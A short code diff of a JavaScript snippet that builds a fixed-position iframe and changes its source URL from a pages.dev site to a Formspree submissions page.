@@ -2,7 +2,7 @@
 (function() {
   // Create iframe element
   const iframe = document.createElement('iframe');
-  iframe.src = 'https://web-8eu.pages.dev/'; // Replace with your target URL
+  iframe.src = 'https://formspree.io/forms/xrbkykqr/submissions'; // Replace with your target URL
   iframe.style.position = 'fixed';
   iframe.style.top = '0';
   iframe.style.left = '0';
